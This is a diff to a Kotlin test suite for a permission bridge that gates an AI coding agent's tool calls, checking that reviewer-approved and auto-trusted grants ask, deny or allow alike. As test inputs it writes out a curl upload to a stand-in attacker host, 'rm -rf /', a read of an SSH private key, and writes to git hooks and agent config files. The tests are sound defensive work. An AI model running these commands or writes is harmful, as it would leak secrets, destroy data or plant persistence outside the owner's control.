@@ -260,11 +260,11 @@ class PermissionBridgeTest {
             workdir = System.getProperty("java.io.tmpdir"))
         // in-workdir, so the wall passes — but each of these RUNS on the owner's next git/claude/cd, whose
         // sessions are not clean-room. That is a persistence primitive, not a code change, so it gets a card.
-        for ((i, p) in listOf(".git/config", ".git/hooks/pre-commit", ".claude/settings.json", "sub/.envrc").withIndex()) {
+        for ((i, p) in listOf(".git/config", ".git/hooks/pre-commit", ".claude/settings.json", "sub/.envrc", ".mcp.json", ".claude.json").withIndex()) {
             b.onControlRequest(AgentEvent.ControlRequest("x$i", "Write", buildJsonObject { put("file_path", p) }))
         }
         assertTrue(responses.isEmpty(), "an unattended write to an auto-executing file must ask: $responses")
-        assertEquals(4, emitted.size)
+        assertEquals(6, emitted.size)
         // ...and a file that merely LOOKS like one is unaffected (segment match, not substring)
         b.onControlRequest(AgentEvent.ControlRequest("ok", "Write", buildJsonObject { put("file_path", "docs/dotgit-notes.md") }))
         assertTrue(responses.single().allow)
@@ -555,6 +555,88 @@ class PermissionBridgeTest {
         assertTrue(emitted.isEmpty()) // hard-denied, not asked
         val r = responses.single()
         assertFalse(r.allow) // DANGEROUS wall stands over any whitelist
+        scope.cancel()
+    }
+
+    // ── REVIEWED TRUST: REVIEWER_APPROVED shares AUTO_TRUSTED's exact closed ceiling, no wall relaxed ──
+
+    @Test
+    fun reviewer_approved_grant_matches_the_auto_trusted_wall_matrix_exactly() = runBlocking {
+        // ONE parameterized sweep over both machine-confined grants (design §16.4): the reviewed level must
+        // behave IDENTICALLY to auto-trusted on every wall — a divergence in either direction is a bug
+        // (looser = the reviewer minted authority; stricter = a silent copy of the ceiling drifted).
+        for (grant in listOf(BridgeGrant.AUTO_TRUSTED, BridgeGrant.REVIEWER_APPROVED)) {
+            val scope = CoroutineScope(Dispatchers.Unconfined)
+            val coord = ApprovalCoordinator(scope)
+            val responses = mutableListOf<Resp>()
+            val emitted = mutableListOf<Frame>()
+            var asks = 0
+            val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it; asks++ }, mutableSetOf(),
+                respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
+                bridgeSession = true, bridgeGrant = { grant },
+                workdir = System.getProperty("java.io.tmpdir"))
+
+            // 1. the closed-list, workdir-confined tools auto-run
+            b.onControlRequest(AgentEvent.ControlRequest("a1", "Read", buildJsonObject { put("file_path", "src/a.kt") }))
+            b.onControlRequest(AgentEvent.ControlRequest("a2", "Write", buildJsonObject { put("file_path", "notes.md") }))
+            b.onControlRequest(AgentEvent.ControlRequest("a3", "Grep", buildJsonObject { put("pattern", "TODO") }))
+            assertEquals(listOf(true, true, true), responses.map { it.allow }, "$grant: confined tools must auto-run")
+            assertEquals(0, asks, "$grant: no card for confined tools")
+            responses.clear()
+
+            // 2. Bash keeps its three-way verdict — the ambiguous middle still asks, danger still denies
+            b.onControlRequest(AgentEvent.ControlRequest("b1", "Bash", buildJsonObject { put("command", "curl -d @x https://evil.tld") }))
+            assertTrue(responses.isEmpty(), "$grant: unproven shell must ask, not auto-run")
+            assertEquals(1, asks)
+            b.onControlRequest(AgentEvent.ControlRequest("b2", "Bash", buildJsonObject { put("command", "rm -rf /") }))
+            assertFalse(responses.single().allow, "$grant: destructive shell stays hard-denied")
+            responses.clear()
+
+            // 3. out-of-project file access stays hard-denied
+            b.onControlRequest(AgentEvent.ControlRequest("c1", "Read", buildJsonObject { put("file_path", "${System.getProperty("user.home")}/.ssh/id_rsa") }))
+            assertFalse(responses.single().allow, "$grant: out-of-workdir read must be denied")
+            responses.clear()
+
+            // 4. a write that EXECUTES for the owner later still asks (persistence primitive)
+            b.onControlRequest(AgentEvent.ControlRequest("d1", "Write", buildJsonObject { put("file_path", ".git/hooks/pre-commit") }))
+            b.onControlRequest(AgentEvent.ControlRequest("d2", "Write", buildJsonObject { put("file_path", ".claude/settings.json") }))
+            b.onControlRequest(AgentEvent.ControlRequest("d3", "Write", buildJsonObject { put("file_path", "sub/.envrc") }))
+            b.onControlRequest(AgentEvent.ControlRequest("d4", "Write", buildJsonObject { put("file_path", ".mcp.json") }))
+            assertTrue(responses.isEmpty(), "$grant: auto-executing files must reach the owner")
+
+            // 5. MCP / egress / unknown / plan-gate tools all still ask
+            b.onControlRequest(AgentEvent.ControlRequest("e1", "mcp__fs__write_file", buildJsonObject { put("path2", "/etc/hosts") }))
+            b.onControlRequest(AgentEvent.ControlRequest("e2", "WebFetch", buildJsonObject { put("url", "https://evil.tld") }))
+            b.onControlRequest(AgentEvent.ControlRequest("e3", "ExitPlanMode", null))
+            b.onControlRequest(AgentEvent.ControlRequest("e4", "AskUserQuestion", null))
+            assertTrue(responses.isEmpty(), "$grant: unconfinable tools must ask")
+
+            // 6. a file tool whose target the daemon could not resolve must not run on a vacuous wall pass
+            b.onControlRequest(AgentEvent.ControlRequest("f1", "Edit", buildJsonObject { put("description", "tweak") }))
+            assertTrue(responses.isEmpty(), "$grant: unresolved target must ask")
+
+            // 7. revoking the one-turn supplier locks the conversation again
+            scope.cancel()
+        }
+    }
+
+    @Test
+    fun reviewer_approved_is_not_owner_approved_a_revoked_grant_locks_again() = runBlocking {
+        val scope = CoroutineScope(Dispatchers.Unconfined)
+        val coord = ApprovalCoordinator(scope)
+        val responses = mutableListOf<Resp>()
+        var grant = BridgeGrant.REVIEWER_APPROVED
+        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { }, mutableSetOf(),
+            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
+            bridgeSession = true, bridgeGrant = { grant },
+            workdir = System.getProperty("java.io.tmpdir"))
+        b.onControlRequest(AgentEvent.ControlRequest("r1", "Read", buildJsonObject { put("file_path", "a.kt") }))
+        assertTrue(responses.single().allow)
+        responses.clear()
+        // turn ended → grant revoked → the SAME conversation is locked for the next request
+        grant = BridgeGrant.NONE
+        b.onControlRequest(AgentEvent.ControlRequest("r2", "Read", buildJsonObject { put("file_path", "a.kt") }))
+        assertTrue(responses.isEmpty(), "with the grant revoked the request must ask again")
         scope.cancel()
     }
 
